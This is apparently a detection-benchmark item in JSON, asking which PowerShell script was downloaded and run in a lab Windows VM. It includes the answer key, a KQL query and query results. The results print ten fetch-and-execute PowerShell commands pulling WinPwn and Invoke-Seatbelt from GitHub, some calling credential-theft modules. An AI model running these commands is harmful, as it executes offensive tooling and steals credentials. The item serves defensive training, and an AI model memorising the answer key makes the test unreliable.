@@ -1,0 +1,86 @@
+{
+    "technique_id": "T1082",
+    "question_id": "5c16ceb4-ba3a-43d7-b848-a13c1f216d95",
+    "context": "In a Windows environment, an adversary used PowerShell to download and execute a host-survey utility from the internet for “safety checks.”",
+    "objective": "Determine the exact name of the script file that was fetched over the network and subsequently run.",
+    "technical_details": {
+        "command_analysis": "Examine process creation logs for PowerShell commands invoking DownloadString from a remote URL and note the script reference.",
+        "detection_approach": "Query DeviceProcessEvents for InitiatingProcessCommandLine containing patterns like ‘downloadstring(...Invoke-Seatbelt.ps1)’ and capture the script filename."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Frame the question to have the analyst tie together the download URL with the executed script name, resulting in a single filename answer.",
+    "prompt": "Windows: Investigate PowerShell process events for instances where a web client fetched and executed an external host-survey tool. What was the name of the script file that was downloaded and run?",
+    "answer": [
+        "Invoke-Seatbelt.ps1"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where tolower(FileName) == \"powershell.exe\"\n| where ProcessCommandLine contains \"DownloadString(\"\n| extend ScriptName = extract(@\"([A-Za-z0-9_-]+\\.ps1)\", 1, ProcessCommandLine)\n| where isnotempty(ScriptName)\n| project TimeGenerated, DeviceName, ScriptName, ProcessCommandLine",
+    "KQL_validation_message": "KQL query validation successful: The query results include a row (['2025-05-07 16:55:58.422367+00:00', 'windows-vm', 'Invoke-Seatbelt.ps1', '...']) where the 'ScriptName' is 'Invoke-Seatbelt.ps1'. This is the expected value needed to answer the detection question. Therefore, the results would provide the evidence needed to identify activities related to Invoke-Seatbelt.ps1 being executed.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "ScriptName",
+            "ProcessCommandLine"
+        ],
+        [
+            "2025-05-07 16:23:05.768042+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput}"
+        ],
+        [
+            "2025-05-07 16:33:47.688445+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput}"
+        ],
+        [
+            "2025-05-07 16:33:47.688849+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput}"
+        ],
+        [
+            "2025-05-07 16:53:40.942799+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput}"
+        ],
+        [
+            "2025-05-07 16:55:05.043527+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive}"
+        ],
+        [
+            "2025-05-07 16:55:58.422367+00:00",
+            "windows-vm",
+            "Invoke-Seatbelt.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \\\"\"-group=all\\\"\"}"
+        ],
+        [
+            "2025-05-07 17:04:08.356314+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive}"
+        ],
+        [
+            "2025-05-07 17:04:33.962811+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive}"
+        ],
+        [
+            "2025-05-07 17:06:40.943659+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput}"
+        ],
+        [
+            "2025-05-07 17:09:15.750449+00:00",
+            "windows-vm",
+            "WinPwn.ps1",
+            "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive}"
+        ]
+    ]
+}
